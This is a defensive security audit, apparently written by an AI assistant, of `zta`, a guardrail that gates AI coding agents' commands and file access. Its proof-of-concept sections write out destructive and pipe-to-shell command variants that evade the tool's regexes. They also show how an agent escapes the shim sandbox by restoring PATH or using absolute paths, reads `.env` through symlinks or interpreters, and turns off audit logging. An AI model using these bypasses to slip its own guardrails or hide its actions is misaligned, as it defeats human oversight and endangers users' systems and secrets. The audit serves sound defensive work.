# Security & Vulnerability Audit — Zero-Trust Agent (`zta`)

**Date:** 2026-06-29
**Auditor:** Claude (Opus 4.8), at the request of the repository owner
**Commit audited:** `05ebf30` (branch `main`)
**Scope:** Full review — (1) vulnerabilities in `zta`'s own implementation and
(2) effectiveness of the security controls `zta` enforces (bypass analysis).
**Method:** Static review of all 26 Go source files (~3 KLOC, stdlib only) plus
**empirical proof-of-concept** verification against a binary built from the audited
commit. Every "Confirmed" finding below was reproduced; the exact commands are
included so you can re-run them.
**Deliverable:** this report only — **no source or policy files were modified.**

---

## 1. Executive summary

`zta` is a well-structured, dependency-free guardrail with a genuinely solid core:
the engine is small and pure, the fail-closed paths all hold (garbage input,
unparseable policy, invalid regex → block), JSON marshaling prevents audit-log
injection, RE2 rules out ReDoS, and every *baseline* dangerous shape it advertises
(`rm -rf /`, `curl | bash`, `git push --force`, `cat .env`, `Read .env`, `Write`
to `.claude/`) is correctly blocked.

The findings are therefore not about the engine being broken — it does what its
regexes say — but about **the gap between what the regexes match and what the
product promises**, plus two concrete implementation defects. The most important
themes:

- **One implementation defect that fails *open*** (Copilot adapter, F1) — it
  contradicts an invariant the code's own comment asserts.
- **The command rules are trivially evaded by ordinary shapes** (`/bin/rm`, `\rm`,
  `rm --recursive --force`, `… | dash`) — F5, F6. These are not exotic; they are
  common ways to write the very commands the rules name.
- **The shim sandbox tier is not a security boundary** against an adversarial or
  prompt-injected agent — a one-line `PATH` restore or an absolute path defeats it
  (F7). The Docker tier is the only real boundary.

Many of these are *partially* disclosed in the README's "Honest limits" section.
Where so, the finding is marked **Known/Accepted** — it is still listed so the
total risk is visible in one place, and so the *specific, fixable* mechanics are
called out (e.g. the regex anchor in F5 is more fixable than the README's blanket
"command rules cover common shapes, not all of them" implies).

### Findings by severity

| Sev | Count | IDs |
|-----|-------|-----|
| Critical | 0 | — |
| High | 0 | — |
| Medium | 4 | F1, F5, F6, F7 |
| Low | 5 | F2, F3, F8, F9, F10 |
| Info | 2 | F4, F11 |

> **Severity calibration.** `zta` positions itself as a *low-blast-radius,
> defense-in-depth* layer, not a sandbox replacement, and ships a hardened Docker
> tier as the real boundary. Nothing here is Critical/High in that framing: no
> finding exposes a secret or grants RCE *that the tool claims to prevent at high
> assurance*. The Medium items are core advertised controls defeated by simple,
> common inputs; that is the right ceiling for a guardrail with an honest threat
> model and a stronger tier behind it.

---

## 2. Findings table

| ID | Title | Sev | Axis | CWE | Location | Status |
|----|-------|-----|------|-----|----------|--------|
| F1 | Copilot adapter fails **open** on nested/array `toolArgs` | Medium | impl-vuln | CWE-693, CWE-20 | `internal/adapter/copilot/copilot.go:46-56,101` | Confirmed |
| F5 | `destructive-delete` regex evaded by path-prefix / escape / long options | Medium | bypass | CWE-625, CWE-184 | `internal/policy/defaults.go:14` | Confirmed |
| F6 | `pipe-to-shell` covers only sh/bash/zsh; misses dash/ash/ksh/interpreters | Medium | bypass | CWE-184 | `internal/policy/defaults.go:20` | Confirmed |
| F7 | Shim tier defeated by absolute path or restoring `ZTA_REAL_PATH` | Medium | bypass | CWE-807, CWE-807 | `internal/sandbox/run.go:60`, `eval.go` | Confirmed |
| F2 | Policy-file override silently replaces whole rule sets | Low | impl-vuln | CWE-1188 | `internal/policy/policy.go:98-104` | Confirmed |
| F3 | Docker `-v` mount specs built by string concat (option injection) | Low | impl-vuln | CWE-88 | `internal/sandbox/docker.go:89,95,98` | Theoretical |
| F8 | IR-01 policy-tamper (exec tier) bypassed by interpreters | Low | bypass | CWE-184 | `internal/policy/defaults.go:38` | Confirmed |
| F9 | Credential/secret-file rules are path-string only (symlink/interpreter/copy) | Low | bypass | CWE-59, CWE-184 | `internal/engine/engine.go:56`, `defaults.go:32,46` | Confirmed (Known) |
| F10 | Secret-content scan: unquoted, split, and encoded secrets pass | Low | bypass | CWE-184 | `internal/policy/defaults.go:71` | Confirmed (Known) |
| F4 | Container secret-masking bounded to 200 files, basename-only | Info | bypass | CWE-184 | `internal/sandbox/docker.go:113-153` | By design |
| F11 | Env-trust: child can set `ZTA_LOG=off` / `ZTA_POLICY` in shim tier | Info | bypass | CWE-807 | `internal/auditlog/auditlog.go:71`, `run.go` | Confirmed |

---

## 3. Detailed findings

### F1 — Copilot adapter fails **open** on nested/array `toolArgs` (Medium, impl-vuln)

**Location:** `internal/adapter/copilot/copilot.go:46-56`, helper `allStrings` at `:101`.

**Description.** The Copilot adapter extracts a command by trying known keys
(`firstString`) and, on miss, falling back to `allStrings(toolArgs)`. The package
comment states the invariant explicitly:

> *"toolArgs key names vary by tool/version, so command and content extraction
> tries the common keys and falls back to all string values — a wrong guess must
> never let a dangerous command through unscanned."*

But `allStrings` only concatenates **top-level string values**. If the command sits
in a **nested object** or an **array** (both common JSON shapes for tool arguments),
extraction yields the empty string, the engine receives an empty `Command`, and
`matchSet` returns "no match" for an empty string (`engine.go:43`) → **ALLOW**.
This violates the stated invariant and fails open — the worst direction for a guard.

**PoC (reproduced):**
```
$ printf '{"toolName":"bash","toolArgs":{"command":"rm -rf /"}}'        | zta guard --agent copilot ; echo $?
# BLOCK (exit 2)   — top-level string, caught
$ printf '{"toolName":"bash","toolArgs":{"input":{"command":"rm -rf /"}}}' | zta guard --agent copilot ; echo $?
# ALLOW (exit 0)   — nested object, MISSED
$ printf '{"toolName":"bash","toolArgs":{"argv":["rm","-rf","/"]}}'     | zta guard --agent copilot ; echo $?
# ALLOW (exit 0)   — array, MISSED
```

**Impact.** Any Copilot tool version that nests command/content (or passes argv as
an array) bypasses the guard entirely. Because the adapter was *designed* around
"unknown key shapes," nested shapes are a realistic, not contrived, case.

**Recommended fix.** Make `allStrings` recurse into nested maps and arrays
(walk the decoded `map[string]any`/`[]any` tree and collect every string), so the
fallback genuinely scans *all* text regardless of nesting. Add table tests for a
nested-object and an array payload mirroring the existing `adapters_test.go`
"unknown-key fallback" case. (The same recursion benefits `codex.go`'s
`apply_patch` extraction, which has the same top-level-only assumption.)

---

### F5 — `destructive-delete` regex evaded by path-prefix, escape, or long options (Medium, bypass)

**Location:** `internal/policy/defaults.go:14`
Pattern: `(?i)(^|[;&|[:space:]])rm[[:space:]]+(-[a-z]*[rf][a-z]*[[:space:]]+)+ … (/|~|\$HOME|\*|/\*|\.\.?) …`

**Description.** Two structural weaknesses:

1. **Anchor.** `rm` must be preceded by start-of-string or one of `; & | space`.
   A path prefix (`/bin/rm`) or a shell escape (`\rm`) puts a `/` or `\` before
   `rm`, so the anchor never matches — even though the command is, verbatim, a
   destructive `rm` of a broad path.
2. **Flag shape.** The flag group matches only short clusters containing `r`/`f`.
   GNU long options (`--recursive --force`) are not short clusters, so they slip
   past.

**PoC (reproduced, hook tier — no execution):**
```
rm -rf /                 -> BLOCK   (baseline works)
/bin/rm -rf /            -> ALLOW   (path prefix evades anchor)
\rm -rf /                -> ALLOW   (escape evades anchor)
rm --recursive --force / -> ALLOW   (long options evade flag matcher)
find / -delete           -> ALLOW   (no rule for find)
```

**Impact.** The single most-named operation in the policy (`rm -rf` of a broad
path) is defeated by ways an agent routinely writes commands. Unlike interpreter
gaps (which the README discloses), the anchor/long-option misses are *the same tool
on the same path* and are squarely fixable.

**Recommended fix.** Anchor on a word boundary at the program token instead of a
fixed separator set — match `rm` when it is the command word regardless of a path
prefix (e.g. allow an optional `[^\s;&|]*/` directory prefix and a leading `\`),
and add an alternative for `--recursive`/`--force` long forms. Add `find … -delete`
and `shred`/`unlink` to the deny set or document them as out of scope. Add the four
PoC strings above as `engine_test.go` cases.

---

### F6 — `pipe-to-shell` covers only sh/bash/zsh; misses other shells and interpreters (Medium, bypass)

**Location:** `internal/policy/defaults.go:20`
Pattern: `\|[[:space:]]*(ba|z)?sh([[:space:]]|$)`

**Description.** The rule matches a pipe into `sh`, `bash`, or `zsh` only. It misses:
- **Other POSIX shells:** `dash`, `ash`, `ksh`, `fish`.
- **Interpreters:** `… | python`, `… | perl`, `… | ruby`, `… | node`.
- **Non-pipe equivalents:** `eval "$(curl …)"`, `bash <(curl …)` (process
  substitution), `. /dev/stdin`.

There is also an **internal inconsistency**: the sandbox `shells` map
(`internal/sandbox/eval.go:19`) *does* list `dash`, `ash`, and `ksh` as shells
worth intercepting, but the pipe-to-shell content rule does not match them.

**PoC (reproduced):**
```
curl x | sh    -> BLOCK      curl x | dash  -> ALLOW
curl x | bash  -> BLOCK      curl x | ash   -> ALLOW
curl x | zsh   -> BLOCK      curl x | ksh   -> ALLOW
                             curl x | fish  -> ALLOW
eval "$(curl x)" -> ALLOW    bash <(curl x) -> ALLOW
```

**Impact.** "Pipe untrusted remote code into a shell" — the rule's stated purpose —
is bypassed by naming any shell other than three, or by `eval`/process
substitution. Partly disclosed by the README's interpreter caveat, but the
sh/dash/ksh gap and the `eval $(...)` gap are not obvious from the docs.

**Recommended fix.** Broaden the interpreter alternation to
`(ba|z|da|a|k)?sh|fish|python[0-9.]*|perl|ruby|node`, and add a rule for
`eval[[:space:]]*["']?\$\(` and `<\((curl|wget|fetch)`. Reconcile the rule with the
`shells` map so the two lists can't drift.

---

### F7 — Shim tier is defeated by absolute path or restored `ZTA_REAL_PATH` (Medium, bypass)

**Location:** `internal/sandbox/run.go:60` (exports `ZTA_REAL_PATH` to the child),
shim resolution in `run.go`/`eval.go`.

**Description.** The shim backend works by putting a temp directory of wrapper
scripts first on `PATH`, so name lookups for `bash`, `rm`, `git`, … route through
`zta __shim`. Two facts make this a *naive-mistake* guardrail, not a boundary
against an adversarial or prompt-injected agent:

1. The real `PATH` is **handed to the child** in `ZTA_REAL_PATH` so shims can find
   the real binaries. The child can simply restore it: `PATH="$ZTA_REAL_PATH"`.
2. Name-based shimming is inherently bypassed by **absolute paths** (`/bin/rm …`),
   which perform no `PATH` lookup.

**PoC (reproduced, safe).** A sentinel policy denies the harmless, *shimmed*
command `git status`. The denied token is split with `printf` so the outer
(shimmed) `bash -c` string never literally contains `git status` — isolating the
escape mechanic from string obfuscation:

```
# sentinel.json: deny_exec pattern "git[[:space:]]+status"

# Control 1 — name shim active, no PATH reset:
zta run --policy sentinel.json -- bash -c 's=$(printf "g""it"" ""status"); $s'
  -> BLOCKED  ("zta: blocked in sandbox [TEST/sentinel]")   # shim caught child git

# Control 2 — identical, but child restores PATH from the exported var:
zta run --policy sentinel.json -- bash -c 'export PATH="$ZTA_REAL_PATH"; s=$(printf "g""it"" ""status"); $s'
  -> git RAN, no block                                       # BYPASS

# Control 3 — child calls git by absolute path:
zta run --policy sentinel.json -- bash -c 'sub=$(printf "sta""tus"); /usr/bin/git "$sub"'
  -> git RAN, no block                                       # BYPASS
```

Controls 1 and 2 differ only in the `PATH` restore, so the bypass is attributable
to that (and to absolute paths in Control 3), not to the obfuscation.

**Impact.** Against an adversarial/injected agent the shim tier provides no
assurance; it only catches commands the agent passes, unobfuscated, through a
shimmed shell. The README *does* say the shim "intercepts commands, not raw
syscalls," but it does not say that an agent can disable name interception in one
line — and the explicit `ZTA_REAL_PATH` export hands it the means.

**Recommended fix.** Two parts: (a) **Docs** — state plainly that the shim tier is
a guardrail against accidental/naive commands and that the **Docker tier is the
boundary** for untrusted agents. (b) **Hardening** — stop exporting the real `PATH`
to the child; have `zta __shim` recover the real binary from a private channel the
child cannot read (e.g. a fd or a value baked into each generated shim script),
raising the bar so PATH restoration alone doesn't work. (Absolute-path invocation
remains fundamentally unsolvable by PATH shimming — which is the point of (a).)

---

### F2 — Policy-file override silently replaces entire rule sets (Low, impl-vuln)

**Location:** `internal/policy/policy.go:98-104`.

**Description.** `Load` unmarshals the JSON policy file *over* the defaults, and as
the comment notes, "any rule set the file specifies replaces that default set."
A file containing `{"deny_exec": []}` therefore **silently disables all exec
protections** while keeping the others. There is no warning, and `zta init --policy`
scaffolds a starter that mirrors the defaults — a user who trims one section to
customize it loses that whole category without feedback. Combined with the
env-supplied `ZTA_POLICY` (F11), this is the disable primitive behind the shim-tier
weakness.

**Impact.** Foot-gun → silent loss of enforcement; not directly attacker-triggered
unless the attacker can also place/point a policy file.

**Recommended fix.** Either deep-merge rule sets (append override rules to the
built-ins) or, at minimum, emit a stderr warning when a provided policy yields
*fewer* rules in any category than the defaults. Document that an empty array means
"disable this category."

---

### F3 — Docker `-v` mount specs built by string concatenation (Low, impl-vuln)

**Location:** `internal/sandbox/docker.go:89,95,98`
(`opts.Root+":/workspace"`, `opts.PolicyFile+":/zta-policy.json:ro"`,
`emptyFile+":/workspace/"+m+":ro"`).

**Description.** Mount arguments are assembled by concatenating paths around `:`
separators. Docker parses `-v` as colon-delimited `src:dst:opts`. A project root,
policy path, or extra-mount value containing a `:` (or crafted suffix) could inject
an extra mount field (e.g. flip `:ro` to `:rw`, or add `:z`). Exploitability is low:
these paths come from `--root`/cwd and `--policy`, not directly from the agent, and
`absPath` normalizes them — but the values are not validated for `:`.

**Recommended fix.** Reject or escape `:` in `Root`/`PolicyFile`/extra mounts, or
use Docker's `--mount type=bind,src=…,dst=…` syntax which takes explicit key=value
fields and is not colon-positional.

---

### F8 — IR-01 policy-tamper (exec tier) bypassed by interpreters (Low, bypass)

**Location:** `internal/policy/defaults.go:38`
Pattern matches a fixed tool list `(rm|mv|cp|chmod|chown|truncate|tee|dd|ln|install|sed -i)`
before `.claude/`/`.zta/`, or a `>`/`>>` redirect into them.

**Description.** Writing to the integrity-protected directories via a **shell
redirect** (`echo x > .claude/settings.json`) is correctly blocked, and the
**hook-tier `Write` tool** to `.claude/` is blocked by `protectedWrite`
(`engine.go:79`). But an **interpreter** that opens the file directly is neither a
listed tool nor a redirect:

```
echo pwned > .claude/settings.json                          -> BLOCK
python3 -c "f=open('.claude/x','w')"                        -> ALLOW   (exec tier)
Write tool -> .claude/settings.json                         -> BLOCK   (hook tier OK)
```

**Impact.** An agent running `zta run` (sandbox) or whose hook only sees the Bash
string can tamper with the policy directory via `python`/`perl`/`node`. Same root
cause as F6/F9 (interpreters are opaque to string rules).

**Recommended fix.** This cannot be fully solved at the string layer; the durable
fix is OS-level (the Docker tier already mounts policy read-only — recommend the
same `:ro` bind for `.claude/`/`.zta/` even in the shim tier where feasible, or
rely on filesystem permissions). At the rule layer, optionally add common
interpreter+`open(...,'w')` shapes, but treat that as best-effort.

---

### F9 — Credential/secret-file rules are path-string matches (Low, bypass — Known)

**Location:** `internal/engine/engine.go:56` (`secretFile`),
`internal/policy/defaults.go:32,46` (credential patterns).

**Description.** File rules match the **literal path string** the agent supplies.
They are bypassed by indirection:
```
Read tool, file_path = "notes.txt"  (a symlink -> .env)     -> ALLOW, reads .env
python3 -c "open('.env').read()"                            -> ALLOW (interpreter)
cp .env /tmp/x ; cat /tmp/x                                 -> the cp is blocked, but a copy
                                                               via interpreter/redirect is not
```
The symlink case is confirmed: a `Read` of a path that points at `.env` is allowed
because the engine sees only the symlink name.

**Status.** Largely disclosed by the README ("does not trap file reads/writes the
agent's own process performs directly"). Listed for completeness; the symlink-name
case is worth an explicit doc mention.

**Recommended fix.** Where the guard has filesystem access (hook tier), resolve the
path (`filepath.EvalSymlinks`) before matching, so a symlink to a credential file is
caught. Interpreter reads remain an OS-tier concern.

---

### F10 — Secret-content scan: unquoted, split, and encoded secrets pass (Low, bypass — Known)

**Location:** `internal/policy/defaults.go:71` (`generic-secret`), `engine.go:33`.

**Description.**
```
api_key = "supersecretvalue123"   (quoted)    -> BLOCK
api_key = supersecretvalue123     (unquoted)  -> ALLOW   # generic-secret requires ['"]
AKIAIOSFODNN7EXAMPLE              (whole)      -> BLOCK
AKIAIOSF…  +  …7EXAMPLE  across two Edits      -> ALLOW   # each chunk scanned alone
base64(secret) then decode on write            -> ALLOW   # not in the 8 patterns
```
The `generic-secret` pattern requires the value to be wrapped in quotes, so
unquoted assignments (`.env`-style, YAML scalars) pass. Content is scanned per
write event, so a secret split across two `Edit`s — or encoded — is never seen
whole.

**Status.** Inherent to per-write regex scanning; partly disclosed. The
quote-requirement gap is a concrete, fixable narrowing.

**Recommended fix.** Drop the mandatory quotes from `generic-secret`
(match `…(key|secret|token)\s*[=:]\s*\S{8,}` with sensible boundaries), accepting
some additional false positives. Split/encoded exfil cannot be caught by
stateless content scanning — note it as out of scope.

---

### F4 — Container secret-masking is bounded and basename-only (Info, by design)

**Location:** `internal/sandbox/docker.go:113-153` (`secretFilesIn`, `looksSecret`).

`secretFilesIn` walks the repo, masks at most **200** files, skips
`.git`/`node_modules`/`vendor`, and matches **by basename only**. A repo with >200
secret-named files, or a secret in a skipped directory or under a non-matching name,
is not masked. This is a reasonable bound (keeps the docker command line sane) and
the Docker tier's value is isolation, not masking — noted for awareness, not a
defect. Consider logging when the 200 cap is hit so silent under-masking is visible.

---

### F11 — Env-trust: child can disable logging / swap policy in the shim tier (Info)

**Location:** `internal/auditlog/auditlog.go:71` (`ZTA_LOG`), `internal/sandbox/run.go`.

In the shim tier the child inherits and can mutate the environment, so it can set
`ZTA_LOG=off` to suppress the audit trail or point `ZTA_POLICY` at a permissive
file before invoking shimmed tools. This is the same trust boundary as F7 (the
constrained process controls its own environment) and is mitigated by the same
fix (don't rely on child-readable env for enforcement state; the Docker tier passes
these via the container config, not the agent's shell). Hook-tier logging is
unaffected because the hook process's env is set by the host agent, not the model.

---

## 4. What held up (verified)

These are worth recording — for a security tool, the controls that *survive*
adversarial testing matter as much as the gaps:

- **Fail-closed everywhere it counts.** Garbage stdin, empty stdin, unparseable
  payload, **invalid regex in a policy file**, and policy-load failure all → block
  (exit 2). Verified.
- **Baseline dangerous shapes are blocked:** `rm -rf /`, `rm -fr /`, `curl|bash`,
  `git push --force`, `cat .env`, `Read .env`, `Write`/redirect to `.claude/`.
- **Passthrough is correct:** ungated tools (e.g. `WebFetch`) exit 0 rather than
  erroring, so the guard doesn't break normal operation.
- **No audit-log injection.** Records go through `json.Marshal`, which escapes
  newlines/control chars; a crafted command cannot forge a second log line. Command
  is truncated to 512 bytes. The log never stores file content (avoids logging the
  very secret a rule blocked).
- **No ReDoS.** All matching uses RE2 (`regexp`), which is linear-time; a hostile
  policy pattern cannot cause catastrophic backtracking.
- **Minimal supply chain.** Zero external dependencies (stdlib only); release build
  is `-trimpath` + stripped with published SHA256SUMS.
- **Docker tier is genuinely hardened:** `--network none` default,
  `--security-opt no-new-privileges`, `--cap-drop ALL`, runs as the host non-root
  user, policy mounted read-only. This is the correct place to put the real
  boundary, and it is configured well.

---

## 5. Cross-cutting observations

- **Interpreters are the recurring blind spot** (F6, F8, F9): `python`/`perl`/
  `node`/`ruby` are not shimmed and are opaque to every string-based rule. This is
  the single highest-leverage area — either shim the common interpreters by default
  in `defaultTargets` (raises the bar, still bypassable) or, better, lean on the
  Docker tier and say so loudly.
- **String matching vs. reality** (F5, F7, F9): the engine judges the *text* of a
  command/path, while the OS acts on *resolved* binaries and *resolved* paths. Every
  Medium/Low bypass lives in that gap. The two durable mitigations are (a) resolve
  before matching where the guard has FS access (symlinks, path prefixes), and
  (b) treat the Docker tier as the boundary for adversarial agents.
- **Posture auditor honesty** (`internal/audit/audit.go:75-78`): a repo scores PASS
  for AC-01/IA-02/OA-01 if it has *either* the legacy bash hooks *or* `zta`
  wiring. During the in-flight migration this can mask a half-migrated repo. Low
  priority, but worth a note in the audit output ("crediting legacy hook X").
- **IO-01 (untrusted input) is delegated, not enforced** by the engine — there is
  no network/WebFetch gating in `zta` itself; `audit.go` credits it only if the
  agent's own `permissions` list gates `WebFetch`. Consistent with the threat model,
  but means "external content is untrusted" (CLAUDE.md / IO-01) is a documentation
  control, not a runtime one.

---

## 6. Prioritized remediation

1. **F1 (Medium):** make the Copilot/Codex fallback recurse into nested objects and
   arrays — small, high-value, fixes a fail-open that contradicts the code's own
   invariant. Add nested/array tests.
2. **F5 + F6 (Medium):** harden the `destructive-delete` anchor (path prefix, `\`,
   long options) and broaden `pipe-to-shell` (other shells + interpreters + `eval`),
   reconciling with the `shells` map. Add the PoC strings as regression tests.
3. **F7 (Medium):** sharpen the docs (shim = naive-guardrail; Docker = boundary) and
   stop exporting the real `PATH` to the child.
4. **F2, F3, F8, F9, F10 (Low):** merge-or-warn on policy override; avoid colon-
   positional `-v`; resolve symlinks before path matching; drop the mandatory quotes
   in `generic-secret`.

> **Note on applying fixes:** the rule files live in `internal/policy/` (Go source),
> *not* under the integrity-protected `.claude/`/`.zta/`, so fixes F1/F5/F6/F10 are
> ordinary code changes and are **not** blocked by `zta`'s own guard. They should go
> through the normal reviewed-PR flow per `CLAUDE.md` / control IR-01.

---

## Appendix A — Reproduction

All PoCs were run black-box against a binary built from commit `05ebf30`:

```
go build -o /tmp/zta ./cmd/zta
export ZTA_LOG=off
# hook-tier probes:  printf '<json>' | /tmp/zta guard --agent <claude-code|copilot> ; echo $?
#   exit 2 = BLOCK, exit 0 = ALLOW/passthrough
# shim-tier probes:  /tmp/zta run --policy sentinel.json -- bash -c '<payload>'
#   stderr "blocked in sandbox" = BLOCK; command output = BYPASS
```

No real credentials were used (dummy `.env`/example keys only); shim-tier execution
PoCs used a read-only `git status` sentinel so nothing destructive ran. Baseline
`go build`, `go vet`, `gofmt -l`, and `go test ./...` were all clean before and
after the audit; no repository source files were modified.
